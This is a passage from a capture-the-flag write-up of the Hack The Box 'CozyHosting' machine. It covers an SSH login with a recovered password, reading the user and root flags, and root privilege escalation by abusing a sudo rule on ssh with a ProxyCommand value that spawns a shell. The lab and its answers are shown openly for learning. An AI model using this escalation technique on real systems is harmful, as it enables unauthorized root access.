+There's a password, `manchesterunited`, I use it to SSH into the user `josh`.
+
+```
+$ ssh josh@cozyhosting.htb
+josh@cozyhosting.htb's password:
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+...
+josh@cozyhosting:~$ cat user.txt
+e1d078c09c4e025113ee74b108f407ec
+```
+
+And there's the user flag! <mark>e1d078c09c4e025113ee74b108f407ec</mark>
+
+## Root Flag
+
+Running `sudo -l` gives us an entry:
+
+```
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh:
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+```
+
+Looking at [ssh entries on GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo) gives us an entry for sudo permissions.
+
+```
+josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# cat /root/root.txt
+55d1af421b8828f1c8c1ccacb64347bb
+```
+
+The root flag is: <mark>55d1af421b8828f1c8c1ccacb64347bb</mark>
+
+Success!
+
+![Success](/images/htb/easy/cozyhosting/submitted.png)
+
+## Thanks for reading!
+Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).
+
+You can also find my other contacts on the [whoami](../about) page.
